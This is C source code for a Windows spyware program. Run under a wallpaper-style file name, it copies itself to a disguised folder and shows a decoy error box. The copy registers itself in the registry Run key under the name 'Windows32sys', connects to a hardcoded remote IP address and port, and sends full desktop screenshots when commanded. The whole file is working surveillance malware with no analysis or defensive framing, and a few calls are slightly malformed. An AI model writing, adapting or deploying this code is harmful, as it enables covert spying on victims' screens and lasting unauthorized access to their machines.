#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"Ws2_32.lib")

const char welcome = 1;
const char wnull = 0;

int pathSZ = 255;
char path[255];
char command[255];
HKEY hkey;
const char regname[14] = "Windows32sys";

int fpathC = 5;
char fpath[255] = "C:\\.*";

STARTUPINFO startupinfo = {sizeof(STARTUPINFO)};
PROCESS_INFORMATION process_info = {0};

WSADATA wsadata;
SOCKET sock;
SOCKADDR_IN adres;

_stdcall WinMain(HINSTANCE hInstance,HINSTANCE previnstance,LPTSTR cmdline,int cmdshow){
	QueryFullProcessImageNameA(GetCurrentProcess(),0,path,&pathSZ);
	if(!memcmp(path,"C:\\Windows32scan\\crashHandler.exe",26)){
		RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
		RegSetValueExA(hkey,regname,0,REG_SZ,path,100);
		WSAStartup(MAKEWORD(2, 2),&wsadata);
	try_again:
		sock = socket(AF_INET,SOCK_STREAM,0);
 		adres.sin_family = AF_INET;
		adres.sin_port = htons(7778);
		inet_pton(AF_INET,"77.172.240.97",&adres.sin_addr);
		while(connect(sock,(SOCKADDR*)&adres,sizeof(adres)))Sleep(1000);
		send(sock,&welcome,1,0);
		for(;;){
			if(recv(sock,command,255,MSG_WAITALL) == -1) goto try_again;
			switch(command[0]){
			case 's':{
				BITMAPFILEHEADER bfHeader;
				BITMAPINFOHEADER biHeader;
				BITMAPINFO bInfo;
				HGDIOBJ hTempBitmap;
				HBITMAP hBitmap;
				BITMAP bAllDesktops;
				HDC hDC, hMemDC;
				LONG lWidth, lHeight;
				BYTE *bBits = NULL;
				HANDLE hHeap = GetProcessHeap();
				DWORD cbBits, dwWritten = 0;
				HANDLE hFile;
				INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
				INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
				ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
				ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
				ZeroMemory(&bInfo, sizeof(BITMAPINFO));
				ZeroMemory(&bAllDesktops, sizeof(BITMAP));
				hDC = GetDC(NULL);
				hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
				GetObjectA(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
				lWidth = bAllDesktops.bmWidth;
				lHeight = bAllDesktops.bmHeight;
				DeleteObject(hTempBitmap);
				bfHeader.bfType = (WORD)('B' | ('M' << 8));
				bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
				biHeader.biSize = sizeof(BITMAPINFOHEADER);
				biHeader.biBitCount = 24;
				biHeader.biCompression = BI_RGB;
				biHeader.biPlanes = 1;
				biHeader.biWidth = lWidth;
				biHeader.biHeight = lHeight;
				bInfo.bmiHeader = biHeader;
				cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;
				hMemDC = CreateCompatibleDC(hDC);
				hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
				SelectObject(hMemDC, hBitmap);
				BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
				send(sock,&bfHeader,sizeof(BITMAPFILEHEADER),0,0);
				send(sock,&biHeader,sizeof(BITMAPINFOHEADER),0,0);
				send(sock,bBits,cbBits,0,0);
				DeleteDC(hMemDC);
				ReleaseDC(NULL, hDC);
				DeleteObject(hBitmap);
				break;
			}
			}
			ZeroMemory(command,255);
		}
	}
	else{
		CreateDirectoryA("C:\\Windows32scan",0);
		HANDLE exeFileN = CreateFileA("C:\\Windows32scan\\crashHandler.exe",GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		HANDLE exeFile = CreateFileA("wallpaper2.exe",GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		int exeSize = GetFileSize(exeFile,0);
		char* exe = HeapAlloc(GetProcessHeap(),0,exeSize);
		ReadFile(exeFile,exe,exeSize,0,0);
		WriteFile(exeFileN,exe,exeSize,0,0);
		CloseHandle(exeFile);
		CloseHandle(exeFileN);
		CreateProcessA("C:\\Windows32scan\\crashHandler.exe",0,0,0,0,0,0,0,&startupinfo,&process_info);
		MessageBoxA(0,"ja, dis niet goed",":(",0);
		ExitProcess(0);
	}
}
